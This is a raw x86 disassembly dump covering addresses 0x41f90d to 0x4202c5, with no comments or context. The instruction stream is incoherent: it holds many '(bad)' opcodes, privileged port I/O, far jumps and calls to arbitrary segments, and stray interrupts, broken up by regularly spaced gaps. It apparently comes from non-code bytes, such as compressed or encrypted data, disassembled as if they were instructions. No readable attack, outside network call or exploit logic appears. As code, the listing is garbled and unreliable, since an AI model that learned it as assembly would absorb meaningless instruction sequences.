  41f90d:	and    BYTE PTR [esi-0x35],cl
  41f910:	popf   
  41f911:	pop    esp
  41f912:	mov    ecx,0xc15ca95c
  41f917:	popf   
  41f918:	iret   
  41f919:	dec    ecx
  41f91a:	(bad)  
  41f91b:	int3   
  41f91c:	mov    WORD PTR ds:0x39c8f355,?
  41f922:	dec    esi
  41f923:	mov    dh,0x20
  41f925:	aas    
  41f926:	adc    DWORD PTR [esi],0x5a
  41f929:	sub    ah,ch
  41f92b:	jl     0x41f8e2
  41f92d:	mov    ebx,0xc5e08d73
  41f932:	int3   
  41f933:	imul   ebp,DWORD PTR [ecx+eiz*1+0x7d3a0df0],0xffffff9b
  41f93b:	sbb    BYTE PTR [eax-0x10],cl
  41f93e:	jbe    0x41f944
  41f940:	loopne 0x41f8c2
  41f942:	jg     0x41f8cd
  41f944:	xchg   esp,eax
  41f945:	pushf  
  41f946:	std    
  41f947:	xor    bh,BYTE PTR [ebx-0x7e3de55b]
  41f94d:	lods   al,BYTE PTR ds:[esi]
  41f94e:	mov    ch,0xbd
  41f950:	les    edi,FWORD PTR [edx-0x54]
  41f953:	jne    0x41f967
  41f955:	adc    BYTE PTR [ecx+0x61893e89],al
  41f95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f95c:	aam    0xe0
  41f95e:	push   es
  41f95f:	repnz bound ebx,QWORD PTR ds:0xa37910c1
  41f966:	push   ss
  41f967:	or     eax,0x59f03a8
  41f96c:	int3   
  41f96d:	out    dx,al
  41f96e:	jbe    0x41f9c3
  41f970:	inc    edx
  41f971:	repz xor DWORD PTR [ecx],edi
  41f974:	add    DWORD PTR [ebx-0x6173b060],edi
  41f97a:	mov    esp,0x63314379
  41f97f:	imul   eax,DWORD PTR [ecx],0xc93e8ee5
  41f985:	adc    eax,0x18c7bd29
  41f98a:	lahf   
  41f98b:	mov    gs:0xb6c172c3,eax
  41f991:	(bad)  
  41f992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f993:	loop   0x41f9c4
  41f995:	jne    0x41f99e
  41f997:	cmp    eax,0xdeee22e1
  41f99c:	xor    BYTE PTR [ecx],cl
  41f99e:	jae    0x41f927
  41f9a0:	aaa    
  41f9a1:	inc    ecx
  41f9a2:	and    dl,ah
  41f9a4:	mov    cl,BYTE PTR [ebx+0x4d]
  41f9a7:	outs   dx,BYTE PTR ds:[esi]
  41f9a8:	leave  
  41f9a9:	aam    0x99
  41f9ab:	push   edx
  41f9ac:	scas   al,BYTE PTR es:[edi]
  41f9ad:	ins    BYTE PTR es:[edi],dx
  41f9ae:	imul   edx,DWORD PTR [esi+edx*2],0xc0212381
  41f9b5:	jo     0x41fa03
  41f9b7:	push   cs
  41f9b8:	pop    ebx
  41f9b9:	in     al,0xf1
  41f9bb:	mov    bl,0x7b
  41f9bd:	jnp    0x41f957
  41f9bf:	lea    esi,[eax]
  41f9c1:	jmp    0x82bb:0xfb0639d5
  41f9c8:	sbb    BYTE PTR ds:0xb3b51f01,bh
  41f9ce:	pop    es
  41f9cf:	push   0xc5b76e8b
  41f9d4:	int    0x4a
  41f9d6:	retf   0x6bfa
  41f9d9:	jge    0x41f998
  41f9db:	sar    BYTE PTR [edi+0x38063ab1],0xa4
  41f9e2:	ja     0x41fa4e
  41f9e4:	dec    eax
  41f9e5:	inc    ecx
  41f9e6:	push   es
  41f9e7:	(bad)  
  41f9e8:	jnp    0x41f9b0
  41f9ea:	popa   
  41f9eb:	dec    ebx
  41f9ec:	push   edi
  41f9ed:	aaa    
  41f9ee:	inc    ebx
  41f9ef:	bound  edi,QWORD PTR [esi-0x3a]
  41f9f2:	sbb    al,0xb
  41f9f4:	mov    ecx,0x5f84ca94
  41f9f9:	jae    0x41f9f5
  41f9fb:	jle    0x41f9fb
  41f9fd:	pop    esp
  41f9fe:	aaa    
  41f9ff:	push   0xfffffff1
  41fa01:	dec    ecx
  41fa02:	inc    eax
  41fa03:	out    dx,eax
  41fa04:	jmp    0xb266b02e
  41fa09:	push   0xffffff90
  41fa0b:	imul   edx,DWORD PTR [edx],0x5b
  41fa0e:	cmp    dl,bl
  41fa10:	test   DWORD PTR [eax],eax
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0xbfe02c16
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x27000001
  41fa8d:	dec    edx
  41fa8e:	sbb    BYTE PTR [ebp+0x7dc03e16],ch
  41fa94:	popf   
  41fa95:	out    dx,eax
  41fa96:	adc    eax,0x72621c97
  41fa9b:	dec    ecx
  41fa9c:	repnz stos BYTE PTR es:[edi],al
  41fa9e:	cmp    eax,0xcf7809ce
  41faa3:	test   esi,0x2c0d4cf9
  41faa9:	mov    gs,ebx
  41faab:	jp     0x41facf
  41faad:	pop    edx
  41faae:	sub    BYTE PTR ds:0x7a7cb899,ah
  41fab4:	or     al,0x25
  41fab6:	popa   
  41fab7:	in     al,dx
  41fab8:	mov    ebx,DWORD PTR [edx-0x68fb78eb]
  41fabe:	xor    DWORD PTR [esi],0x63b1d908
  41fac4:	xlat   BYTE PTR ds:[ebx]
  41fac5:	jle    0x41fb41
  41fac7:	dec    esp
  41fac8:	xor    ecx,DWORD PTR [edx-0x6e]
  41facb:	dec    ecx
  41facc:	xchg   esi,eax
  41facd:	pop    eax
  41face:	call   0x5eb8b43a
  41fad3:	jle    0x41fb52
  41fad5:	adc    esi,ebp
  41fad7:	mov    eax,0x996f3dda
  41fadc:	cmp    al,0xb2
  41fade:	fwait
  41fadf:	outs   dx,DWORD PTR ds:[esi]
  41fae0:	imul   ebp,DWORD PTR [edi-0x7bc79274],0x5c
  41fae7:	adc    DWORD PTR [eax-0x17],0x52
  41faeb:	adc    al,BYTE PTR [ecx-0x6e1412fd]
  41faf1:	inc    edi
  41faf2:	xchg   esp,eax
  41faf3:	sbb    eax,0xe0becd5b
  41faf8:	into   
  41faf9:	sub    al,0xba
  41fafb:	lock sti 
  41fafd:	mov    DWORD PTR [ebx],esi
  41faff:	and    BYTE PTR [esi+eiz*1],ch
  41fb02:	sub    esi,DWORD PTR [edi+0x2773293d]
  41fb08:	ret    
  41fb09:	add    eax,0x16d74aae
  41fb0e:	stos   BYTE PTR es:[edi],al
  41fb0f:	mov    bl,0xcf
  41fb11:	mov    edi,0x672a8ef5
  41fb16:	mov    ah,0xad
  41fb18:	dec    edx
  41fb19:	mov    dl,0x89
  41fb1b:	sbb    dh,BYTE PTR [edi]
  41fb1d:	fs jae 0x41fb97
  41fb20:	retf   0x2c04
  41fb23:	push   es
  41fb24:	lods   al,BYTE PTR ds:[esi]
  41fb25:	in     eax,dx
  41fb26:	out    0xb0,al
  41fb28:	lea    edx,[eax-0x46b04460]
  41fb2e:	jb     0x41faf0
  41fb30:	mov    ecx,0xd2340732
  41fb35:	lahf   
  41fb36:	push   es
  41fb37:	adc    cl,bl
  41fb39:	stos   BYTE PTR es:[edi],al
  41fb3a:	faddp  st(4),st
  41fb3c:	push   0xe119330c
  41fb41:	add    al,BYTE PTR [ebx]
  41fb43:	sub    DWORD PTR [edx],esp
  41fb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb46:	jle    0x41fb4e
  41fb48:	cmp    cl,BYTE PTR [ebx-0x5ca54b2a]
  41fb4e:	in     al,0x72
  41fb50:	and    eax,0x54662968
  41fb55:	pop    ecx
  41fb56:	sbb    BYTE PTR [edx-0x4228cb69],0xc7
  41fb5d:	dec    edx
  41fb5e:	add    eax,0xe9bce826
  41fb63:	adc    ch,BYTE PTR [edi]
  41fb65:	adc    bl,BYTE PTR [ecx+edx*4+0x3d]
  41fb69:	ja     0x41fbd5
  41fb6b:	push   edi
  41fb6c:	add    edi,ebx
  41fb6e:	push   es
  41fb6f:	retf   0x9e12
  41fb72:	xchg   esp,eax
  41fb73:	repnz inc esi
  41fb75:	dec    ecx
  41fb76:	dec    ebp
  41fb77:	ins    DWORD PTR es:[edi],dx
  41fb78:	rcr    BYTE PTR [ebx+0x7e43b325],cl
  41fb7e:	aam    0xca
  41fb80:	ja     0x41fb0c
  41fb82:	xchg   ecx,eax
  41fb83:	out    dx,al
  41fb84:	xor    al,BYTE PTR [ebp-0x42]
  41fb87:	pop    ds
  41fb88:	push   0xffffffd7
  41fb8a:	dec    ebp
  41fb8b:	(bad)  
  41fb8c:	xchg   edx,eax
  41fb8d:	arpl   WORD PTR cs:[esi],cx
  41fb90:	dec    eax
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	push   ds
  41fc01:	ds mov ch,0x34
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xec000001
  41fc0d:	xor    esp,edx
  41fc0f:	pusha  
  41fc10:	cmp    BYTE PTR [edi+0x1b],al
  41fc13:	jnp    0x41fc0f
  41fc15:	in     al,0xa1
  41fc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc18:	ss lahf 
  41fc1a:	(bad)  [eax]
  41fc1c:	add    bl,BYTE PTR [ecx+0x6a]
  41fc1f:	push   ecx
  41fc20:	das    
  41fc21:	add    eax,DWORD PTR [ebp+0x6b]
  41fc24:	mov    eax,0xd7de87cb
  41fc29:	aaa    
  41fc2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc2b:	out    dx,al
  41fc2c:	mov    ebp,0x79518bfc
  41fc31:	xlat   BYTE PTR ds:[ebx]
  41fc32:	mov    eax,0x4f0cbb23
  41fc37:	out    0x84,al
  41fc39:	es out dx,eax
  41fc3b:	mov    edi,DWORD PTR [edx-0x70d083b9]
  41fc41:	les    ebx,FWORD PTR [ebx+0x57c69dce]
  41fc47:	cmp    BYTE PTR [ecx+0x21e4f9bc],bl
  41fc4d:	cwde   
  41fc4e:	nop
  41fc4f:	jns    0x41fc44
  41fc51:	mov    ds:0x4faec9b,al
  41fc56:	dec    ebx
  41fc57:	fwait
  41fc58:	jge    0x41fcd9
  41fc5a:	push   ebx
  41fc5b:	sti    
  41fc5c:	aad    0x2d
  41fc5e:	jl     0x41fbff
  41fc60:	rcr    DWORD PTR [esi+eax*8-0x2ad8e2c6],cl
  41fc67:	mov    eax,ds:0x4ae9adf7
  41fc6c:	iret   
  41fc6d:	inc    ebx
  41fc6e:	rcr    BYTE PTR [esi+edi*8],1
  41fc71:	add    al,0x2
  41fc73:	daa    
  41fc74:	arpl   WORD PTR [edi+0x194b3914],dx
  41fc7a:	adc    bl,al
  41fc7c:	mov    eax,DWORD PTR [edi-0x1e39e11a]
  41fc82:	add    DWORD PTR [ecx-0x51d1eed7],ecx
  41fc88:	push   ss
  41fc89:	ins    BYTE PTR es:[edi],dx
  41fc8a:	(bad)  
  41fc8c:	and    eax,0xdbb4e90d
  41fc91:	mov    bp,0xfc5f
  41fc95:	in     al,0xdd
  41fc97:	sbb    eax,0x50e8178a
  41fc9c:	sbb    DWORD PTR [edi+0x4a],eax
  41fc9f:	mov    edi,ecx
  41fca1:	xor    dh,ah
  41fca3:	pushf  
  41fca4:	pop    esi
  41fca5:	stos   BYTE PTR es:[edi],al
  41fca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fca7:	in     al,0x4f
  41fca9:	adc    eax,DWORD PTR [ebp+0x35]
  41fcac:	jg     0x41fc8e
  41fcae:	mov    al,ch
  41fcb0:	pushf  
  41fcb1:	xchg   esp,ebx
  41fcb3:	push   esi
  41fcb4:	or     ah,BYTE PTR [esi]
  41fcb6:	and    ebx,DWORD PTR [ecx]
  41fcb8:	lahf   
  41fcb9:	into   
  41fcba:	shl    DWORD PTR [ecx+0x54],cl
  41fcbd:	out    0x52,eax
  41fcbf:	shl    edi,0xbc
  41fcc2:	lahf   
  41fcc3:	xor    eax,DWORD PTR [esi]
  41fcc5:	fsub   QWORD PTR [esi]
  41fcc7:	or     edi,DWORD PTR [ecx-0x1d]
  41fcca:	mov    esp,DWORD PTR [edi-0x448a81b6]
  41fcd0:	cmp    esi,ebx
  41fcd2:	xor    al,0xfd
  41fcd4:	dec    eax
  41fcd5:	lahf   
  41fcd6:	sbb    BYTE PTR [edx-0x6947eeee],al
  41fcdc:	popf   
  41fcdd:	ret    
  41fcde:	cmp    al,0xdf
  41fce0:	dec    edx
  41fce1:	les    ebp,FWORD PTR [esi+ecx*4]
  41fce4:	icebp  
  41fce5:	and    DWORD PTR fs:[ebp-0x37f486ba],eax
  41fcec:	clc    
  41fced:	hlt    
  41fcee:	dec    esp
  41fcef:	rcr    DWORD PTR ds:[ebx],1
  41fcf2:	xor    ecx,esp
  41fcf4:	sub    eax,0xf572d8b3
  41fcf9:	scas   al,BYTE PTR es:[edi]
  41fcfa:	repnz pop ebp
  41fcfc:	out    dx,al
  41fcfd:	fidiv  DWORD PTR [esi]
  41fcff:	ror    BYTE PTR [ebp-0x593840bb],0xf
  41fd06:	push   ebx
  41fd07:	inc    esp
  41fd08:	icebp  
  41fd09:	je     0x41fcfa
  41fd0b:	cmp    DWORD PTR [edi+edi*1+0x3b],ebp
  41fd0f:	jo     0x41fd68
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	loopne 0x41fdcf
  41fd82:	mov    ch,BYTE PTR [edi+0x15357]
  41fd88:	add    eax,0x66000001
  41fd8d:	and    ebp,DWORD PTR [edi-0x22]
  41fd90:	ret    0xe8ef
  41fd93:	sub    BYTE PTR [ebx+edx*4],cl
  41fd96:	jg     0x41fdc9
  41fd98:	sbb    DWORD PTR [esi+esi*8-0x6d],edx
  41fd9c:	js     0x41fd48
  41fd9e:	xor    DWORD PTR [esi-0x53b48276],ebp
  41fda4:	xchg   ebx,eax
  41fda5:	sub    edi,ecx
  41fda7:	and    bh,BYTE PTR [edx]
  41fda9:	into   
  41fdaa:	jnp    0x41fd54
  41fdac:	(bad)
  41fdaf:	dec    esi
  41fdb0:	sbb    al,0x8c
  41fdb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdb3:	or     al,0xd5
  41fdb5:	mov    ds:0xd5086d9e,al
  41fdba:	and    BYTE PTR [ebx],dl
  41fdbc:	gs xor eax,0x4360d6c1
  41fdc2:	jo     0x41fd5c
  41fdc4:	ins    DWORD PTR es:[edi],dx
  41fdc5:	out    dx,eax
  41fdc6:	pop    ebp
  41fdc7:	mov    ds:0x8699f482,eax
  41fdcc:	int    0xcd
  41fdce:	stos   DWORD PTR es:[edi],eax
  41fdcf:	mov    ebx,0x62f8c742
  41fdd4:	out    dx,eax
  41fdd5:	and    esp,esi
  41fdd7:	addr16 in al,0x91
  41fdda:	(bad)
  41fddd:	call   0x6d5d484c
  41fde2:	mov    ebp,0x3dcc1708
  41fde7:	cmp    ebp,DWORD PTR [edx+0x741b91ce]
  41fded:	xchg   ebp,eax
  41fdee:	outs   dx,BYTE PTR ds:[esi]
  41fdef:	sub    ecx,eax
  41fdf1:	rcr    DWORD PTR [esi+ebp*2+0x76],0x3e
  41fdf6:	jbe    0x41fe1f
  41fdf8:	addr16 test eax,0xbc4c12a2
  41fdfe:	out    dx,eax
  41fdff:	ret    0xb986
  41fe02:	leave  
  41fe03:	stc    
  41fe04:	repz pop ebp
  41fe06:	daa    
  41fe07:	xor    al,0x77
  41fe09:	push   0x10
  41fe0b:	outs   dx,DWORD PTR ds:[esi]
  41fe0c:	repz shr dl,1
  41fe0f:	jp     0x41fda1
  41fe11:	cmp    DWORD PTR [ecx],0xffffffda
  41fe14:	add    ah,ah
  41fe16:	imul   edx,esp,0x2eda62a3
  41fe1c:	push   0x42
  41fe1e:	jl     0x41fe33
  41fe20:	jne    0x41fe4c
  41fe22:	mov    esi,0xcff8f140
  41fe27:	jno    0x41fe43
  41fe29:	mov    bh,BYTE PTR [edx+0x52]
  41fe2c:	mov    ds:0xcba5a0fd,al
  41fe31:	push   cs
  41fe32:	(bad)  ds:[ebx]
  41fe35:	fild   QWORD PTR ds:0xe8056d0b
  41fe3b:	call   0x51bf:0x95e147e6
  41fe42:	fldenv [ebx-0x11]
  41fe45:	jns    0x41fe37
  41fe47:	or     edx,DWORD PTR ds:0xa3afbbf4
  41fe4d:	or     eax,0x599488cf
  41fe52:	loopne 0x41fde3
  41fe54:	(bad)  
  41fe55:	call   0x1899179f
  41fe5a:	inc    eax
  41fe5b:	pop    ebx
  41fe5c:	into   
  41fe5d:	das    
  41fe5e:	add    DWORD PTR [esi],eax
  41fe60:	ins    BYTE PTR es:[edi],dx
  41fe61:	das    
  41fe62:	imul   esp,DWORD PTR [ebx],0x6f80b6ef
  41fe68:	(bad)  
  41fe69:	xchg   al,dh
  41fe6b:	pop    ebx
  41fe6c:	fdivr  st(6),st
  41fe6e:	mov    ebp,0xf84e2783
  41fe73:	popa   
  41fe74:	stc    
  41fe75:	or     al,0x90
  41fe77:	mov    BYTE PTR [esp+ebp*1],0xc6
  41fe7b:	lahf   
  41fe7c:	leave  
  41fe7d:	xor    edi,edi
  41fe7f:	ret    
  41fe80:	out    dx,al
  41fe81:	jecxz  0x41fed2
  41fe83:	aaa    
  41fe84:	xchg   edx,eax
  41fe85:	ror    BYTE PTR [edx+0x1f4f7c22],1
  41fe8b:	outs   dx,DWORD PTR ds:[esi]
  41fe8c:	xchg   ecx,eax
  41fe8d:	push   ebx
  41fe8e:	test   BYTE PTR [eax+ecx*1+0x0],0x0
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x53
  41ff01:	adc    eax,edi
  41ff03:	jnp    0x41ff61
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0xd000001
  41ff0d:	jnp    0x41ff2f
  41ff0f:	xor    DWORD PTR [ecx+ecx*2],0xffffff8a
  41ff13:	sar    BYTE PTR [esi+0x11],cl
  41ff16:	bndstx ds:0x68e1b09c,(bad)
  41ff1d:	mov    al,0x31
  41ff1f:	mov    ds:0x81aafc0b,al
  41ff24:	pop    edi
  41ff25:	int3   
  41ff26:	daa    
  41ff27:	mov    al,0x2d
  41ff29:	mov    al,0x9b
  41ff2b:	std    
  41ff2c:	pop    es
  41ff2d:	cmc    
  41ff2e:	mov    eax,ds:0x3312ad76
  41ff33:	iret   
  41ff34:	adc    al,0xbc
  41ff36:	and    al,0x5b
  41ff38:	out    0x3f,eax
  41ff3a:	imul   eax,DWORD PTR [esi-0x11],0x51f652e9
  41ff41:	fsub   QWORD PTR [edi]
  41ff43:	xor    eax,0x9a03f11e
  41ff48:	xrelease mov DWORD PTR [eax+0x3e9ba33a],ebp
  41ff4f:	and    al,bl
  41ff51:	sub    DWORD PTR [eax-0xef9b3c6],ecx
  41ff57:	in     eax,0x65
  41ff59:	call   0x9db3:0x20d25daa
  41ff60:	frstor [ebp-0x1c3995cf]
  41ff66:	inc    DWORD PTR [edi-0x16cdd85b]
  41ff6c:	ss scas eax,DWORD PTR es:[edi]
  41ff6e:	xchg   ebx,eax
  41ff6f:	data16 clc 
  41ff71:	lods   eax,DWORD PTR ds:[esi]
  41ff72:	rcl    ebx,1
  41ff74:	out    0x6c,eax
  41ff76:	pop    esi
  41ff77:	mov    al,ds:0xab99f995
  41ff7c:	xor    dl,BYTE PTR [eax-0x13cf66c9]
  41ff82:	out    dx,al
  41ff83:	(bad)  
  41ff84:	dec    esi
  41ff85:	(bad)
  41ff88:	pop    ss
  41ff89:	imul   edx,DWORD PTR [edx+ebx*1+0x18],0xffffff9f
  41ff8e:	fsub   QWORD PTR [ebp-0x1e]
  41ff91:	test   DWORD PTR [edx+0x29286369],ecx
  41ff97:	je     0x41ff1b
  41ff99:	test   DWORD PTR [ebx],0x192692d4
  41ff9f:	repz mov bl,0x37
  41ffa2:	adc    al,0xb8
  41ffa4:	pop    ebx
  41ffa5:	cs loopne 0x41ff2b
  41ffa8:	shr    DWORD PTR [esi],cl
  41ffaa:	mov    DWORD PTR [ecx],edx
  41ffac:	call   0x7ae4927a
  41ffb1:	int3   
  41ffb2:	push   ds
  41ffb3:	jo     0x41ff80
  41ffb5:	sub    al,0x92
  41ffb7:	xchg   esp,eax
  41ffb8:	lods   al,BYTE PTR ds:[esi]
  41ffb9:	adc    dl,BYTE PTR [ecx-0x1d244d24]
  41ffbf:	dec    ebx
  41ffc0:	pop    edx
  41ffc1:	adc    esp,DWORD PTR [ecx-0x25eaf6e4]
  41ffc7:	sub    al,0xf6
  41ffc9:	stos   BYTE PTR es:[edi],al
  41ffca:	dec    edx
  41ffcb:	jl     0x41ffde
  41ffcd:	out    dx,al
  41ffce:	mov    dl,0xb1
  41ffd0:	ja     0x420016
  41ffd2:	mov    eax,esp
  41ffd4:	pop    edi
  41ffd5:	mov    ch,0x3a
  41ffd7:	cwde   
  41ffd8:	cld    
  41ffd9:	jnp    0x420023
  41ffdb:	xor    ch,BYTE PTR [ecx]
  41ffdd:	jne    0x41ff8d
  41ffdf:	pop    esp
  41ffe0:	cmp    DWORD PTR [eax-0x3b],eax
  41ffe3:	cmp    ah,BYTE PTR [ebx]
  41ffe5:	loope  0x41ff93
  41ffe7:	fs scas al,BYTE PTR es:[edi]
  41ffe9:	xlat   BYTE PTR ds:[ebx]
  41ffea:	loop   0x41ff77
  41ffec:	add    eax,0x1fb26012
  41fff1:	push   ss
  41fff2:	(bad)  
  41fff3:	fistp  QWORD PTR [ebx+0x3e9afa98]
  41fff9:	or     eax,0x24aa325b
  41fffe:	ja     0x420041
  420000:	xchg   esp,eax
  420001:	aas    
  420002:	icebp  
  420003:	aas    
  420004:	xchg   ebp,eax
  420005:	cmp    DWORD PTR [edx-0x46],ebx
  420008:	adc    al,0xf5
  42000a:	lods   eax,DWORD PTR ds:[esi]
  42000b:	and    eax,0x5f67c9a2
  420010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x21
  420081:	sbb    eax,DWORD PTR [ebx+0x1556107]
  420087:	add    BYTE PTR ds:0xd3000001,al
  42008d:	repnz push 0xca0b73a9
  420093:	inc    ecx
  420094:	ret    0xd080
  420097:	jmp    FWORD PTR [ebx+0x584c816]
  42009d:	(bad)  
  42009e:	cmc    
  42009f:	and    ebx,DWORD PTR [ecx+0x2d]
  4200a2:	pushf  
  4200a3:	pop    eax
  4200a4:	lahf   
  4200a5:	inc    edx
  4200a6:	pop    ebx
  4200a7:	mov    bl,ah
  4200a9:	mul    DWORD PTR [ebx+0x54057159]
  4200af:	shl    DWORD PTR [eax],1
  4200b1:	loop   0x42012a
  4200b3:	not    BYTE PTR cs:[ecx-0x34206393]
  4200ba:	nop
  4200bb:	jne    0x4200a8
  4200bd:	fs dec esi
  4200bf:	jns    0x420058
  4200c1:	mov    al,dl
  4200c3:	push   ebp
  4200c4:	retf   0x9690
  4200c7:	out    dx,al
  4200c8:	pusha  
  4200c9:	mov    ch,0x3a
  4200cb:	cwde   
  4200cc:	cmp    eax,0xce260d4a
  4200d1:	cld    
  4200d2:	lahf   
  4200d3:	mov    al,BYTE PTR [edx+0x17]
  4200d6:	cmp    al,0x56
  4200d8:	stc    
  4200d9:	retf   0x8071
  4200dc:	adc    eax,0x2734857
  4200e1:	adc    DWORD PTR [ebx+0x30367258],edi
  4200e7:	dec    esp
  4200e8:	xor    eax,DWORD PTR [edx]
  4200ea:	sbb    ebx,DWORD PTR [ebx]
  4200ec:	xchg   BYTE PTR [edx-0x5a],ch
  4200ef:	(bad)  
  4200f0:	mov    dl,0x27
  4200f2:	fsub   QWORD PTR [ebx-0x23792c3c]
  4200f8:	in     al,0x3f
  4200fa:	push   ebp
  4200fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200fc:	inc    ebp
  4200fd:	mov    edi,0x5bd0f4b0
  420102:	dec    eax
  420103:	aas    
  420104:	sbb    eax,0x925ce28e
  420109:	ja     0x4200ba
  42010b:	mov    al,BYTE PTR [ebp+0x52b90d46]
  420111:	mov    WORD PTR [esi+ecx*4-0x18],ds
  420115:	call   0x86d04a38
  42011a:	(bad)  
  42011b:	popf   
  42011c:	arpl   bp,bx
  42011e:	sub    esi,DWORD PTR [edx]
  420120:	dec    BYTE PTR [ebx]
  420122:	arpl   WORD PTR [edx-0x4f10830],si
  420128:	mov    ebx,0x89398983
  42012d:	mov    ch,0xf6
  42012f:	stos   BYTE PTR es:[edi],al
  420130:	sbb    BYTE PTR [ecx-0x48],dh
  420133:	test   eax,0x4471de21
  420138:	push   ebx
  420139:	cmp    dh,BYTE PTR [edi-0x14e891fd]
  42013f:	fadd   st(0),st
  420141:	into   
  420142:	and    dl,dh
  420144:	jae    0x4200e8
  420146:	push   es
  420147:	or     cl,BYTE PTR [ecx+0x6b]
  42014a:	jbe    0x420136
  42014c:	ja     0x4200de
  42014e:	call   0xbea:0xd04a0427
  420155:	fiadd  DWORD PTR gs:[ebx]
  420158:	call   0x6688:0xdfa87166
  42015f:	xor    ah,BYTE PTR [ebx+0x45e27921]
  420165:	ds pop esi
  420167:	jecxz  0x420186
  420169:	add    al,0x36
  42016b:	pop    esi
  42016c:	popf   
  42016d:	inc    ebp
  42016e:	adc    BYTE PTR [ebx-0x27],dl
  420171:	retf   
  420172:	push   0xffffffc4
  420174:	in     eax,0xe2
  420176:	cwde   
  420177:	sbb    eax,0x69499736
  42017c:	js     0x42011f
  42017e:	xchg   edi,eax
  42017f:	test   eax,0x45321589
  420184:	hlt    
  420185:	in     al,dx
  420186:	push   es
  420187:	lea    ebx,[eax]
  420189:	xlat   BYTE PTR ds:[ebx]
  42018a:	loop   0x4201a9
  42018c:	pusha  
  42018d:	sbb    ebp,DWORD PTR [ecx]
  42018f:	sbb    al,0xc6
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x2872cb81],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xca000001
  42020d:	inc    ebx
  42020e:	ins    DWORD PTR es:[edi],dx
  42020f:	xchg   edi,eax
  420210:	dec    ch
  420212:	sbb    al,0x5d
  420214:	inc    ebx
  420215:	lods   al,BYTE PTR ds:[esi]
  420216:	mov    eax,ds:0x6298c805
  42021b:	push   ds
  42021c:	ds int3 
  42021e:	sub    al,0xbc
  420220:	sbb    al,0x71
  420222:	lock mov al,ds:0xe8050203
  420228:	mov    cl,BYTE PTR [edi]
  42022a:	adc    al,0x1f
  42022c:	dec    esi
  42022d:	or     bh,ah
  42022f:	stc    
  420230:	sub    ah,BYTE PTR [edx+0x51265bae]
  420236:	cmp    DWORD PTR [edi],0x1d2490f3
  42023c:	out    0x87,eax
  42023e:	cmp    al,0x5c
  420240:	mov    bh,BYTE PTR [edx+edx*4+0x5a0ab17e]
  420247:	push   edi
  420248:	fwait
  420249:	mov    dh,0x36
  42024b:	and    DWORD PTR [eax+ebp*2+0x3d],edi
  42024f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420250:	test   eax,0xff8fc1de
  420255:	push   0xffffffb7
  420257:	popa   
  420258:	repz ret 
  42025a:	jo     0x420284
  42025c:	mov    edi,0x225309f9
  420261:	push   esi
  420262:	sub    al,0xd0
  420264:	sub    BYTE PTR [edx],dh
  420266:	pop    ss
  420267:	add    eax,0x716f447a
  42026c:	dec    edx
  42026d:	test   al,0x12
  42026f:	cdq    
  420270:	push   ds
  420271:	sahf   
  420272:	jecxz  0x4201f6
  420274:	enter  0x6f3b,0xd1
  420278:	(bad)  
  420279:	xchg   edx,eax
  42027a:	stos   BYTE PTR es:[edi],al
  42027b:	pop    esp
  42027c:	or     al,BYTE PTR [edx-0x9]
  42027f:	and    al,0x87
  420281:	shl    DWORD PTR [edi+0x4fb3f788],1
  420287:	cli    
  420288:	sub    BYTE PTR [edx+0x35802572],ch
  42028e:	repz add al,0x29
  420291:	inc    ecx
  420292:	in     eax,0xca
  420294:	mov    edx,0xeca4e7c5
  420299:	sub    ecx,DWORD PTR [ecx-0x397bd311]
  42029f:	pop    edi
  4202a0:	push   ebx
  4202a1:	sub    DWORD PTR [edx],0xffffffcb
  4202a4:	jbe    0x4202dc
  4202a6:	push   ebx
  4202a7:	vrcpss xmm4,xmm4,DWORD PTR [ebp-0x76]
  4202ac:	ss pusha 
  4202ae:	pop    ebp
  4202af:	mov    eax,0x86b2fd3e
  4202b4:	push   ss
  4202b5:	jg     0x420301
  4202b7:	cmp    eax,0xdf3b5fa1
  4202bc:	daa    
  4202bd:	push   eax
  4202be:	test   eax,0x3ac52569
  4202c3:	dec    edi
  4202c4:	push   ebp
  4202c5:	mov    ah,0x98
